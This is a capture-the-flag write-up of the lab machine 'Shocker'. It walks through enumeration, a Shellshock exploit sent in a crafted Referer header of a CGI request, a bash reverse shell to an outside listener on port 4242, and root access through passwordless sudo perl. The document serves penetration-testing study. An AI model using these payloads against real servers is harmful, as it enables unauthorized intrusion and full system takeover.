### Shocker

#### Machine IP : 10.10.10.56
Difficulty: Easy

### Scanning

```bash
# Nmap 7.91 scan initiated Tue Jul  6 09:37:03 2021 as: nmap -A -oA nmap/initial 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.088s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  6 09:37:18 2021 -- 1 IP address (1 host up) scanned in 14.87 seconds
```

- Initial Homepage

![homepage](images/homepage.PNG)

__Running Gobuster__

```bash
$ gobuster dir -u  http://10.10.10.56 -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403                                                                                                                                1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/small.txt
[+] Status codes:   200,204,301,302,307,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/07/06 09:43:42 Starting gobuster
===============================================================
/cgi-bin/ (Status: 403)
===============================================================
2021/07/06 09:43:51 Finished
===============================================================
````

- Found `/cgi-bin/` 

__Running gobuster on `/cgi-bin/`__

```bash
$ gobuster dir -u  http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403 -x sh,pl,py
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/cgi-bin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/small.txt
[+] Status codes:   200,204,301,302,307,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh,pl,py
[+] Timeout:        10s
===============================================================
2021/07/06 09:50:15 Starting gobuster
===============================================================
/user.sh (Status: 200)
===============================================================
2021/07/06 09:50:54 Finished
===============================================================
```

- Found `/user.sh` script

Contents
```bash
$ cat user.sh          
Content-Type: text/plain

Just an uptime test script

 10:04:16 up  9:01,  0 users,  load average: 0.06, 0.03, 0.01
```

GET REQUEST
```bash
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Server response(burpsuite- intercepted server response)
```bash
HTTP/1.1 200 OK
Date: Tue, 06 Jul 2021 14:09:20 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 118
                        # becuase of this blank line following is interpreted as response text and as content type is `x-sh` it is not interpreted correctly- change this to `text/plain`(intercepted browser responses in burp) and observe the browser contents
Content-Type: text/plain

Just an uptime test script

 10:09:20 up  9:06,  0 users,  load average: 0.00, 0.00, 0.00
 ```

 ![browser_response](images/browser_response.PNG)


 - Looking for shellshock using nmap

 ```bash
 $: nmap -p8081 -A -oA nmap/shellshock  --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1
```
> nmap didn't result in identifying the shellshock vulnerability but correctly executes the payloads

 ![nmap_request](images/nmap_request.PNG)

edited the request to following 

 ```http
 GET /cgi-bin/user.sh HTTP/1.1
Referer: () { :;}; echo; /bin/ls  
Connection: close
Host: localhost:8081
Content-Length: 2
```

> `/bin/ls` is changed from `ls` as it did'nt work

Adding a revers shell

```http
GET /cgi-bin/user.sh HTTP/1.1
Referer: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.16.23/4242 0>&1
Connection: close
Host: localhost:8081
Content-Length: 2
```

- set up the listener on kali and send the request

__Result__

```bash
$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.16.23] from (UNKNOWN) [10.10.10.56] 60780
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$ 
```

### Privilege escalation

- running `sudo -l` resulted that we can execute `perl` with root privileges

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

__Elevating privileges through `Perl`__

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e "exec('/bin/bash')"
sudo /usr/bin/perl -e "exec('/bin/bash')"
id
uid=0(root) gid=0(root) groups=0(root)
``` 